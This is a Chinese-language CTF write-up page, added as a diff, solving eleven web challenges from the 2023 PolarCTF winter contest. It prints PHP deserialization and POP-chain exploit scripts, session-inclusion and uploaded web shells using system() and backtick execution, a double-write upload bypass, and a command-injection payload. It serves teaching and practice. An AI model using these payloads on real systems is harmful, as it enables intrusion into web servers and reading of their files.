@@ -1,0 +1,461 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[2023PolarCTF冬季赛]WEB WP | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[2023PolarCTF冬季赛]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="WEB
+你想逃也逃不掉
+由于在serialize($user)之后进行了字符串过滤操作，就可以让传入username来吞掉passwd的内容，进而让反序列化字符串的结构发生变化。目的是在passwd构造新的sign属性来覆盖，让新的sign..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [2023PolarCTF冬季赛]WEB WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-09
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023polarctf-dong-ji-sai-web-wp.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web">WEB</h1>
+<h2 id="你想逃也逃不掉">你想逃也逃不掉</h2>
+<p>由于在<code>serialize($user)</code>之后进行了字符串过滤操作，就可以让传入username来吞掉passwd的内容，进而让反序列化字符串的结构发生变化。目的是在passwd构造新的sign属性来覆盖，让新的sign属性为ytyyds。</p>
+<pre><code class="language-php">&lt;?php
+function filter($string){
+    return preg_replace( '/phtml|php3|php4|php5|aspx|gif/','', $string);
+}
+$user['username'] = &quot;skkyphp3php3php3php3php3phtml&quot;;
+$user['passwd'] = 'blu3&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;s:6:&quot;passwd&quot;;s:4:&quot;blu3&quot;;}';
+$user['sign'] = '123456';
+// a:3:{s:8:&quot;username&quot;;s:4:&quot;skky&quot;;s:6:&quot;passwd&quot;;s:4:&quot;blu3&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;}s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;}
+$ans = filter(serialize($user));
+echo $ans.PHP_EOL;
+//$s = 'a:3:{s:8:&quot;username&quot;;s:4:&quot;skky&quot;;s:6:&quot;passwd&quot;;}&quot;;s:4:&quot;blu3&quot;;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;}';
+var_dump(unserialize($ans));
+</code></pre>
+<h2 id="随机值">随机值</h2>
+<p>用取址符号让Polar1和Night在Polar2和Light被赋随机值的时候一起变化。</p>
+<pre><code class="language-php">&lt;?php
+class Index{
+    private $Polar1;
+    private $Polar2;
+    protected $Night;
+    protected $Light;
+
+    public function __construct(){
+        $this-&gt;Polar1 = &amp; $this-&gt;Polar2;
+        $this-&gt;Night = &amp; $this-&gt;Light;
+    }
+}
+echo serialize(new Index());
+</code></pre>
+<h2 id="safe_include">safe_include</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php 
+show_source(__FILE__); 
+@session_start();
+
+ini_set('open_basedir', '/var/www/html/:/tmp/'); 
+
+$sys = @$_SESSION['xxs'];
+if (isset($_GET['xxs'])) {
+    $sys = $_GET['xxs'];
+}
+
+@include $sys;
+
+$_SESSION['xxs'] = $sys;
+</code></pre>
+<p>basedir限制，同时开启了的session，考虑包含session。</p>
+<p>尝试用Cookie中的<code>PHPSESSID=gul18or2ajo45rsfgk416afq95</code>，结合php伪协议读session<code>/?xss=php://filter/convert.base64-encode/resource=/tmp/sess_gul18or2ajo45rsfgk416afq95</code>，发现可以读，同时确定了session文件保存位置。<br>
+<img src="https://skyblu3519.github.io/post-images/1702128789787.png" alt="" loading="lazy"></p>
+<p>根据代码逻辑，第一次访问在session中写入恶意代码，第二次访问包含这个session。用两次请求来执行一次命令</p>
+<pre><code>/?xxs=&lt;?php system($_GET[skky]);?&gt;
+/?xxs=/tmp/sess_gul18or2ajo45rsfgk416afq95&amp;skky=ls /
+</code></pre>
+<p>读取flag<br>
+<img src="https://skyblu3519.github.io/post-images/1702128804668.png" alt="" loading="lazy"></p>
+<h2 id="cool">cool</h2>
+<p>shell_exec执行命令，用通配符读flag，payload</p>
+<pre><code class="language-php">/?a=echo shell_exec(&quot;cat fla*&quot;);
+</code></pre>
+<h2 id="phpurl">phpurl</h2>
+<p>提示的加密字符串是base64，解码找到<code>index.phps</code>。url二次编码拿到flag</p>
+<pre><code>/index.php?sys=%25%37%38%25%37%38%25%37%33
+</code></pre>
+<h2 id="你的马呢">你的马呢？</h2>
+<p>点开题目发现index.php存在文件包含：<code>/index.php?file=upload.php</code>。</p>
+<p>上传的点过滤了所有可以解析为php的后缀，同时对文件内容过滤了<code>&lt;?php</code>。</p>
+<p>上传短标签，结合文件包含执行命令</p>
+<pre><code>&lt;?=`cat /flag.txt`?&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1702128832080.png" alt="" loading="lazy"></figure>
+<p>文件包含<code>/index.php?file=uploads/skky</code><br>
+<img src="https://skyblu3519.github.io/post-images/1702128842062.png" alt="" loading="lazy"></p>
+<h2 id="ezphp">ezphp</h2>
+<p>主页<br>
+<img src="https://skyblu3519.github.io/post-images/1702128854141.png" alt="" loading="lazy"></p>
+<p>访问robots.txt</p>
+<pre><code>User-agent: *
+Disallow: /file
+Disallow: /uploads
+Disallow: /uploads/images
+</code></pre>
+<p><code>/uploads/upload.php</code>上传个<code>.jpg</code>文件</p>
+<pre><code>&lt;?php
+system($_GET[skky]);
+?&gt;
+</code></pre>
+<p><code>/file/file.php?filename=../uploads/images/skky.jpg</code>文件包含，用<code>find / -name flag*</code>找到flag文件位置<br>
+<img src="https://skyblu3519.github.io/post-images/1702128873530.png" alt="" loading="lazy"></p>
+<p>读取<br>
+<img src="https://skyblu3519.github.io/post-images/1702128942967.png" alt="" loading="lazy"></p>
+<h2 id="cookie欺骗">cookie欺骗</h2>
+<p>修改<code>Cookie:user=admin</code></p>
+<h2 id="upload">upload</h2>
+<p>提示源码<code>/?action=show_code</code>，</p>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+ 
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
+        $temp_file = $_FILES['upload_file']['tmp_name'];
+        $img_path = UPLOAD_PATH.'/'.rand(10000,99999).$file_name;        
+        if (move_uploaded_file($temp_file, $img_path)) {
+            $is_upload = true;
+        } else {
+            $msg = '上传出错！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<p>这里对文件后缀是替换为空的，采用双写绕过<code>skky.pphphp</code><br>
+<img src="https://skyblu3519.github.io/post-images/1702128969530.png" alt="" loading="lazy"></p>
+<h2 id="干正则">干正则</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+if (empty($_GET['id'])) {
+    show_source(__FILE__);
+    die();
+} else {
+    include 'flag.php';
+    $a = &quot;www.baidu.com&quot;;
+    $result = &quot;&quot;;
+    $id = $_GET['id'];
+    @parse_str($id);
+    echo $a[0];
+    if ($a[0] == 'www.polarctf.com') {
+        $ip = $_GET['cmd'];
+        if (preg_match('/flag\.php/', $ip)) {
+            die(&quot;don't show flag!!!&quot;);
+        }
+
+        $result .= shell_exec('ping -c 2 ' . $a[0] . $ip);
+        if ($result) {
+            echo &quot;&lt;pre&gt;{$result}&lt;/pre&gt;&quot;;
+        }
+    } else {
+        exit('其实很简单！');
+    }
+}
+</code></pre>
+<p><code>parse_str</code>可以将字符串解析为变量，用它来覆盖<code>$a</code>。命令执行cmd读取flag，用<code>flag.ph*</code>绕过正则</p>
+<pre><code>/?id=a[]=www.polarctf.com&amp;cmd= || cat flag.ph*
+</code></pre>
+<h2 id="苦海">苦海</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+/*
+PolarD&amp;N CTF
+*/
+error_reporting(1);
+
+class User
+{
+    public $name = 'PolarNight';
+    public $flag = 'syst3m(&quot;rm -rf ./*&quot;);';
+
+    public function __construct()
+    {
+        echo &quot;删库跑路，蹲监狱~&quot;;
+    }
+
+    public function printName()
+    {
+        echo $this-&gt;name;
+        return 'ok';
+    }
+
+    public function __wakeup()
+    {
+        echo &quot;hi, Welcome to Polar D&amp;N ~ &quot;;
+        $this-&gt;printName();
+    }
+
+    public function __get($cc)
+    {
+        echo &quot;give you flag : &quot; . $this-&gt;flag;
+    }
+}
+
+class Surrender
+{
+    private $phone = 110;
+    public $promise = '遵纪守法，好公民~';
+
+    public function __construct()
+    {
+        $this-&gt;promise = '苦海无涯，回头是岸！';
+        return $this-&gt;promise;
+    }
+
+    public function __toString()
+    {
+        return $this-&gt;file['filename']-&gt;content['title'];
+    }
+}
+
+class FileRobot
+{
+    public $filename = 'flag.php';
+    public $path;
+
+    public function __get($name)
+    {
+        $function = $this-&gt;path;
+        return $function();
+    }
+
+    public function Get_file($file)
+    {
+        $hint = base64_encode(file_get_contents($file));
+        echo $hint;
+    }
+
+    public function __invoke()
+    {
+        $content = $this-&gt;Get_file($this-&gt;filename);
+        echo $content;
+    }
+}
+
+if (isset($_GET['user'])) {
+    unserialize($_GET['user']);
+} else {
+    $hi = new  User();
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>目的是执行到FileRobot的<code>__invoke</code>，分析代码之后，FileRobot的<code>__get</code>有个可变函数调用的形式。Surrender中的<code>__toString</code>令<code>$this-&gt;file['filename']</code>为一个FileRobot对象来触发FileRobot的<code>__get</code>，最后读出<code>../flag.php</code>（😅）。</p>
+<p>😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅😅</p>
+<p>pop链构造如下</p>
+<pre><code class="language-php">&lt;?php
+class User{
+    public function __construct()
+    {
+        $this-&gt;name = new Surrender();
+    }
+
+}
+
+class Surrender
+{
+    public function __construct()
+    {
+        $o = new FileRobot();
+        $o-&gt;path = new FileRobot();
+        $this-&gt;file['filename'] = $o;
+    }
+}
+
+class FileRobot
+{
+    public $path;
+    public $filename = '../flag.php';
+}
+
+echo serialize(new User());
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1702128982311.png" alt="" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web">WEB</a>
+<ul>
+<li><a href="#%E4%BD%A0%E6%83%B3%E9%80%83%E4%B9%9F%E9%80%83%E4%B8%8D%E6%8E%89">你想逃也逃不掉</a></li>
+<li><a href="#%E9%9A%8F%E6%9C%BA%E5%80%BC">随机值</a></li>
+<li><a href="#safe_include">safe_include</a></li>
+<li><a href="#cool">cool</a></li>
+<li><a href="#phpurl">phpurl</a></li>
+<li><a href="#%E4%BD%A0%E7%9A%84%E9%A9%AC%E5%91%A2">你的马呢？</a></li>
+<li><a href="#ezphp">ezphp</a></li>
+<li><a href="#cookie%E6%AC%BA%E9%AA%97">cookie欺骗</a></li>
+<li><a href="#upload">upload</a></li>
+<li><a href="#%E5%B9%B2%E6%AD%A3%E5%88%99">干正则</a></li>
+<li><a href="#%E8%8B%A6%E6%B5%B7">苦海</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/2023-gu-jian-shan-web-wp/">
+              <h3 class="post-title">
+                [2023古剑山]WEB WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
